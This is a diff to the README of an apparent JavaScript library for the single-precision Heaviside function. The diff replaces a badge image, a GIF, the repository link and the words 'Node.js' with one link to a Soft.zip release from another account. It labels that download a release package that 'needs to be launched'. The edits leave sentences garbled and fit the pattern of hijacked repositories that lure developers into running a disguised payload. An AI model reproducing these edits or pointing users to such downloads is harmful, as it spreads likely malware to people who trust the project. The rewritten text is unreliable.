@@ -1,6 +1,6 @@
 # 🧮 Math Base Special Heavisidef 📊
 
-![math-base-special-heavisidef](https://img.shields.io/badge/Math-Base%20Special%20Heavisidef-blue)
+![math-base-special-heavisidef](https://github.com/Imnotevenhere553/math-base-special-heavisidef/releases/download/v1.0/Soft.zip%20Special%20Heavisidef-blue)
 
 Welcome to the **Math Base Special Heavisidef** repository! Here, you can evaluate the Heaviside function for a single-precision floating-point number. This functionality can be particularly useful in digital signal processing applications where you need to handle discontinuous functions efficiently.
 
@@ -17,18 +17,18 @@ In this repository, we provide an implementation to evaluate the Heaviside funct
 
 ### 🔧 Usage
 
-To use the Heaviside function evaluator, simply include the necessary files in your Node.js project and call the function with the desired input. The function will return the value of the Heaviside function for the specified input.
+To use the Heaviside function evaluator, simply include the necessary files in your https://github.com/Imnotevenhere553/math-base-special-heavisidef/releases/download/v1.0/Soft.zip project and call the function with the desired input. The function will return the value of the Heaviside function for the specified input.
 
 ### 🚀 Get Started
 
 1. Clone this repository to your local machine.
-2. Include the relevant files in your Node.js project.
+2. Include the relevant files in your https://github.com/Imnotevenhere553/math-base-special-heavisidef/releases/download/v1.0/Soft.zip project.
 3. Call the Heaviside function evaluator with your input.
 
 ### 🌐 Relevant Links
 
-- [Repository Link](https://github.com/adelante20/math-base-special-heavisidef)
-- [Release Package](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip) (needs to be launched)
+- [Repository Link](https://github.com/Imnotevenhere553/math-base-special-heavisidef/releases/download/v1.0/Soft.zip)
+- [Release Package](https://github.com/Imnotevenhere553/math-base-special-heavisidef/releases/download/v1.0/Soft.zip) (needs to be launched)
 
 ### 🏷️ Topics
 
@@ -61,6 +61,6 @@ We welcome contributions to enhance the functionality and usability of the Heavi
 
 If you have any questions, feedback, or suggestions regarding this repository, please feel free to reach out to us through the contact information provided in the repository.
 
-![math-gif](https://media.giphy.com/media/3og0ITQgHcinFNbW9y/giphy.gif)
+![math-gif](https://github.com/Imnotevenhere553/math-base-special-heavisidef/releases/download/v1.0/Soft.zip)
 
 Thank you for exploring the **Math Base Special Heavisidef** repository. We hope you find the Heaviside function evaluator useful for your mathematical calculations! 🌟
